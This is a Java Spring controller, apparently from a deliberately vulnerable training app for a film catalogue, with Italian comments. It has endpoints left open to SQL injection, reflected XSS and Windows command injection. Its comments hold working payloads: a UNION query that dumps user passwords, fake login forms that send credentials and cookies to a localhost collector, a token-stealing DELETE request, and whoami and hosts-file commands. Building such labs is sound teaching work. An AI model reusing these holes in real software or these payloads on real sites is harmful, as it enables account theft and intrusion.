package com.example.demo.controller.vulnerable;

import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.CrossOrigin;

import org.springframework.web.bind.annotation.GetMapping;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import com.example.demo.model.Film;

import org.springframework.web.bind.annotation.RequestMethod;
//IMPORT PER SQL INJECTION
import jakarta.persistence.EntityManager; 
import jakarta.persistence.PersistenceContext;
import jakarta.persistence.Query;


import org.slf4j.Logger;
import org.slf4j.LoggerFactory;



@Controller  //se fosse restcontroller non potrebbe fare le chiamate agli html templates
@RequestMapping("/api/film")
@CrossOrigin(
    origins = "https://localhost",
    allowCredentials = "true",
    allowedHeaders = "*",
    methods = {RequestMethod.GET, RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE}
    )
public class modificaFilmVulnerable {

        @PersistenceContext
        private EntityManager entityManager;

        private static final Logger securityLogger = LoggerFactory.getLogger("SecurityLogger");


                // ENDPOINT VULNERABILE A SQL INJECTION

    //x' UNION SELECT username, password, NULL, NULL, NULL, NULL, NULL FROM utenti #  Permette di vedere i dati di un altra tabella
    //' OR '1'='1 # vedi tutti i film che ci sono

    @GetMapping("/cerca")
    @ResponseBody
    public List<Object> cercaFilmVulnerabile(@RequestParam String titolo) {
        
        String username = org.springframework.security.core.context.SecurityContextHolder.getContext().getAuthentication().getName();
        //-------------QUERY NON PARAMETRIZZATA RISCHIO SQLINJECTION-----------------
        String sql = "SELECT * FROM catalogo WHERE titolo = '" + titolo + "'";
        Query query = entityManager.createNativeQuery(sql);
        //----------------QUERY PARAMETRIZZATA PER EVITARE SQL INJECTION-----------------------
        // String sql = "SELECT * FROM catalogo WHERE titolo = :titolo";
    
        // Query query = entityManager.createNativeQuery(sql);
        // query.setParameter("titolo", titolo); 
        //------------------------------------------------------------------------
        
        securityLogger.info("SQL_QUERY_EXECUTION - User: {} | UserInput: {} | FullQuery: {}", username, titolo, sql);

        
        return query.getResultList();
    }

    // LINK PER ATTACCO XSS_REFLECTED PER RUBARE LE CREDENZIALI
    // https://localhost/promo.html?message=%3Cdiv%20style%3D%27background%3A%23333%3Bpadding%3A15px%3Bborder-radius%3A5px%3Bborder%3A1px%20solid%20red%3B%27%3E%3Cp%3ESessione%20Scaduta!%20Riesegui%20il%20login%3A%3C%2Fp%3E%3Cinput%20type%3D%27email%27%20id%3D%27u%27%20placeholder%3D%27Email%27%20style%3D%27width%3A80%25%3B%27%3E%3Cbr%3E%3Cinput%20type%3D%27password%27%20id%3D%27p%27%20placeholder%3D%27Password%27%20style%3D%27width%3A80%25%3Bmargin-top%3A5px%3B%27%3E%3Cbr%3E%3Cbutton%20style%3D%27margin-top%3A10px%3Bbackground%3Ared%3Bwidth%3A80%25%3Bcolor%3Awhite%3B%27%20onclick%3D%22const%20user%3Ddocument.getElementById(%27u%27).value%3Bconst%20pass%3Ddocument.getElementById(%27p%27).value%3Bnew%20Image().src%3D%27http%3A%2F%2Flocalhost%3A8000%2Flog%3Femail%3D%27%2Buser%2B%27%26password%3D%27%2Bpass%3Balert(%27Errore%20di%20connessione%20al%20server.%20Riprova%20pi%C3%B9%20tardi.%27)%3B%22%3EACCEDI%3C%2Fbutton%3E%3C%2Fdiv%3E&sconto=30
    // https://localhost/promo.html?message=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E&sconto=100
    public String redeemCoupon(@RequestParam String message, @RequestParam String sconto) {
        // Restituiamo solo il contenuto, non tutta la struttura card
        return "%s per uno sconto del %s".formatted(message, sconto);
    }

    //https://localhost/api/film/richiesta?richiesta=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27%2Fapi%2Ffilm%2Felimina%2F34%27%2C%7Bmethod%3A%27DELETE%27%2Cheaders%3A%7B%27X-XSRF-TOKEN%27%3Adocument.cookie.match(%2FXSRF-TOKEN%3D(%5B%5E%3B%5D%2B)%2F)%5B1%5D%7D%7D)%22%3E
    // <img src=x onerror="fetch('/api/film/elimina/16', {
    //     method: 'DELETE',
    //     headers: {
    //         'X-XSRF-TOKEN': document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]
    //     }
    // })">

    //https://localhost/richiestaFilm.html?richiesta=%3Cimg%20src=x%20onerror=%22new%20Image().src=%27http://localhost:8000/log?c=%27%2Bbtoa(document.cookie);%22%3E
    @GetMapping("/richiesta")
    @ResponseBody
    public String confermaRichiesta(@RequestParam String richiesta) {
        String username = org.springframework.security.core.context.SecurityContextHolder.getContext().getAuthentication().getName();

        securityLogger.info("RICHIESTA_FILM - User: {} | UserInput: {}", username, richiesta);

        // VULNERABILITÀ: Concatenazione diretta di input utente in una stringa HTML
        // Se 'titolo' contiene uno script, verrà eseguito dal browser del client.

        return "Inviata la richiesta per: "+richiesta;
    }


    //https://localhost/Pagamento_vulnerabile.html?tipo=acquisto&prezzo=12.99&film=%3Cimg%20src%3Dx%20onerror%3D%22document.body.innerHTML%3D%27%3Cdiv%20style%3D%22display%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100vw%3Bheight%3A100vh%3Bbackground%3Alinear-gradient%2845deg%2C%23000%2C%23222%29%3Bz-index%3A9999%3Bcolor%3Awhite%3Bfont-family%3Asans-serif%22%3E%3Cdiv%20style%3D%22background%3A%231a1a1a%3Bpadding%3A60px%3Bborder-radius%3B20px%3Bborder%3A3px%20solid%20red%3Btext-align%3Acenter%3Bbox-shadow%3A0%200%2050px%20rgba%28255%2C0%2C0%2C0.5%29%22%3E%3Ch1%20style%3D%22color%3Ared%3Bmargin-bottom%3A10px%3Bfont-size%3A40px%22%3ESESSIONE%20SCADUTA%3C%2Fh1%3E%3Cp%3EPer%20motivi%20di%20sicurezza%20reinserisci%20i%20dati%3C%2Fp%3E%3Cinput%20id%3Dp%20type%3Dpassword%20placeholder%3DPassword%20style%3D%22padding%3A15px%3Bmargin%3A20px%200%3Bwidth%3A250px%3Bborder-radius%3B5px%22%3E%3Cbr%3E%3Cbutton%20onclick%3D%22fetch%28%5C%27http%3A%2F%2Flocalhost%3A8000%2F%3Fpass%3D%5C%27%2Bdocument.getElementById%28%5C%27p%5C%27%29.value%29%3Balert%28%5C%27Connessione%20ripristinata%21%5C%27%29%3Blocation.href%3D%5C%27https%3A%2F%2Fgoogle.com%5C%27%22%20style%3D%22background%3Ared%3Bcolor%3Awhite%3Bborder%3Anone%3Bpadding%3A15px%3Bborder-radius%3B5px%3Bfont-weight%3Abold%3Bcursor%3Apointer%22%3EACCEDI%3C%2Fbutton%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%27%22%3E
    
    // ENDPOINT VULNERABILE A OS COMMAND INJECTION
    // https://localhost/api/film/export/pdf?stelle=5&continue

    // ## Payload di attacco
    // Verifica Utente (whoami):
    // https://localhost/pdf.html?stelle=4%20%26%20whoami
    
    // Lettura File di Sistema (hosts):
    // https://localhost/export/pdf?stelle=4%20%26%20type%20C:\Windows\System32\drivers\etc\hosts
    
    
    // &whoami         &hostname    &dir    &C:\Users    &ipconfig 
 
    @GetMapping("/export/pdf")
    @ResponseBody
    public String exportCatalogPdf(@RequestParam String stelle) {
        StringBuilder output = new StringBuilder();
        StringBuilder filmList = new StringBuilder();
        try {

            
    
            // VULNERABILITÀ: stelle viene concatenato direttamente nel comando!
            // Lo eseguiamo PRIMA del parseInt così l'injection funziona
            String tempDir = System.getProperty("java.io.tmpdir");
            String pdfPath = tempDir + "catalogo_" + stelle + "_stelle.pdf";
            
            //FUNZIONE VULNERABILE
            Process process = Runtime.getRuntime().exec(
                    "cmd.exe /c echo PDF generato: " + pdfPath + " " + stelle
            );
            
            //Legge l'output del comando del cmd
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));


            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
    
            // Aspettiamo al massimo 5 secondi che il processo finisca
            boolean completato = process.waitFor(5, TimeUnit.SECONDS);

            if (!completato) {
                // Se scatta il timeout, dobbiamo "uccidere" il processo per liberare risorse
                process.destroyForcibly(); 
                return "Errore: Il comando ha impiegato troppo tempo ed è stato terminato.";
            }
    
            // La query al DB la facciamo solo se stelle è un numero valido
            // parseInt qui serve solo per la query, non blocca l'injection sopra
            int stelleInt = Integer.parseInt(stelle.trim());
    
            List<Film> films = entityManager
                    .createQuery("SELECT f FROM Film f WHERE f.recensione = :stelle", Film.class)
                    .setParameter("stelle", stelleInt)
                    .getResultList();
    
            filmList.append("\n--- Film trovati nel DB ---\n");
            for (Film f : films) {
                filmList.append("- ").append(f.getTitolo())
                    .append(" | Stelle: ").append(f.getRecensione())
                    .append(" | Acquisto: ").append(f.getAcquisto()).append("€\n");
            }
    
            String htmlContent = "<html><body><h1>Catalogo - Film con " + stelle + " stelle</h1></body></html>";
            String htmlPath = tempDir + "temp.html";
            FileWriter writer = new FileWriter(htmlPath);
            writer.write(htmlContent);
            writer.close();
    
        } catch (NumberFormatException e) {
            // Se stelle non è un numero (injection), mostriamo solo l'output del comando
            return "<pre>Export completato!\n" + output.toString() + "</pre>";
        } catch (Exception e) {
            return "Errore: " + e.getMessage();
        }
        return "<pre>Export completato: catalogo_" + stelle + "_stelle.pdf\n"
                + output.toString()
                + filmList.toString()
                + "</pre>";
    }
    
}
